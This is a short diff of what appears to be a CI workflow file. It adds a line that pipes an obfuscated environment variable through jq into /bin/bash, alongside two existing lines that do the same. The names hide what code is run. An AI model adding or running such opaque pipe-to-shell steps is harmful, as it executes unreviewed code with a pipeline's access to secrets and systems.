@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$dx1038" | jq -r .y10898 | /bin/bash
           echo $qav04 | jq -r .x54 | /bin/bash
+          echo $osme8 | jq -r .jf182 | /bin/bash
 
       - name: Archive output
         if: always()
